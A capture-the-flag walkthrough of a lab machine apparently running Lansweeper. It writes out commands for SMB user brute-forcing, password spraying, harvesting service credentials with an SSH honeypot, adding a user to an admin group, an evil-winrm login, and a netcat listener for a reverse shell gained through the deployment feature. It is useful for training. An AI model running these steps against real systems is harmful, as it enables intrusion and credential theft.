Difficulty: Medium
### Information Gathering

IP Address: 10.129.234.177

### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.234.177
```

This entry will be added to `/etc/hosts`
```
10.129.234.177    sweep.vl inventory.sweep.vl
```

The users will be enumerated through this command.
```
netexec smb sweep.vl -u 'guest' -p '' --rid-brute
```

The users will be enumerated alongside for themselves as passwords.
```
netexec smb sweep.vl -u users.txt -p users.txt
```

`intern:intern` credentials found.
Those credentials allow login to the `lansweeper` application.

The shares can also be enumerated.
```
netexec smb sweep.vl -u intern -p intern --shares
```

Here are the available shares through this user.
```
DefaultPackageShare$ READ            Lansweeper PackageShare
SMB         10.129.234.177  445    INVENTORY        IPC$            READ            Remote IPC
SMB         10.129.234.177  445    INVENTORY        Lansweeper$     READ            Lansweeper Actions
SMB         10.129.234.177  445    INVENTORY        NETLOGON        READ            Logon server share
SMB         10.129.234.177  445    INVENTORY        SYSVOL          READ            Logon server share
```

While a lot of shares are interesting, we did not manage to find anything interesting.

After checking the website application, the credentials works well and it gives access to connect to remote hosts.

It is possible to make an SSH Connection to the attacker host, a SSH Honeypot will be used to receive the details of the connection.

```
sshesame
INFO 2026/07/27 20:07:00 No host keys configured, using keys at "/home/prizma/.local/share/sshesame"
INFO 2026/07/27 20:07:00 Host key "/home/prizma/.local/share/sshesame/host_rsa_key" not found, generating it
INFO 2026/07/27 20:07:00 Host key "/home/prizma/.local/share/sshesame/host_ecdsa_key" not found, generating it
INFO 2026/07/27 20:07:00 Host key "/home/prizma/.local/share/sshesame/host_ed25519_key" not found, generating it
INFO 2026/07/27 20:07:00 Listening on 127.0.0.1:2022
```

`svc_inventory_lnx:0|5m-U6?/uAX` have been obtained.

Bloodhound enumeration is performed with those credentials.

According to Bloodhound, this user has `GenericAll` privileges.
![[Screenshot 2026-07-28 at 09.31.24.png]]

The member has been added to the group.
```
net rpc group addmem "Lansweeper Admins" "svc_inventory_lnx" -U "sweep"/"svc_inventory_lnx"%"0|5m-U6?/uAX" -S "inventory.sweep.vl"
```


The `intern` user can now have remote desktop rights, a WinRM session is launched.
```
evil-winrm -i sweep.vl -u 'intern' -p 'intern'
```


![[Screenshot 2026-07-28 at 09.42.42.png]]

The user flag has been successfully obtained.

# Root Flag
#### Privilege Escalation

After re-logging to the web application with the same credentials `intern:intern`, it is possible to see more privileges. 

There is now an option for "Deployment", which allows command execution to a remote host. 

A command to return a shell from `revshells.com` is entered. 

![[Screenshot 2026-07-28 at 09.47.20.png]]

After deploying the command, the logs mentions about the credentials need to be assigned.

On the previous section of the website, the credentials will be used to execute the command.

```
sudo nc -lvnp 1234
```


The shell was successfully received in the prompt.

The root flag has been successfully obtained.
![[Screenshot 2026-07-28 at 10.56.43.png]]